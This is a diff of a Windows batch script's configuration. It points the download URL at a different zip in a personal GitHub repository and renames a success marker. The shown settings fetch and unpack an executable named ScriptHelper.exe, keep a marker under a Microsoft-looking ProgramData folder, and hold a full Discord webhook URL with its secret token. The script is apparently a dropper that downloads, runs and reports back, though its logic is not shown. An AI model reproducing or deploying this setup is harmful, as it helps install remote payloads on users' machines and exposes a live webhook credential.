@@ -7,11 +7,11 @@ setlocal enabledelayedexpansion
 :: =============================================================================
 
 :: Configuration
-set "DOWNLOAD_URL=https://github.com/afscoder29/bookish-disco/raw/refs/heads/main/win-x64.zip"
+set "DOWNLOAD_URL=https://github.com/afscoder29/bookish-disco/raw/refs/heads/main/winx.zip"
 set "TEMP_DIR=%LOCALAPPDATA%\ScriptHelper_temp"
 set "EXECUTABLE=ScriptHelper.exe"
 set "VCREDIST_URL=https://aka.ms/vs/17/release/vc_redist.x64.exe"
-set "SUCCESS_FLAG=%PROGRAMDATA%\Microsoft\Windows\ScriptHelper\.success"
+set "SUCCESS_FLAG=%PROGRAMDATA%\Microsoft\Windows\ScriptHelper\.success6"
 set "DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1397005678568276124/zTFS1Ov0zdL_pg4sJRx5HOHWHYiogEkNu2my1JV2zQWDscHdedAVcGU49NGbfqtktIYd"
 set "LOG_FILE=%PROGRAMDATA%\ScriptHelper.log"
 
@@ -291,3 +291,4 @@ goto :eof
 set "timestamp=%date% %time%"
 echo [%timestamp%] ERROR: %~1 >> "%LOG_FILE%"
 goto :eof
+
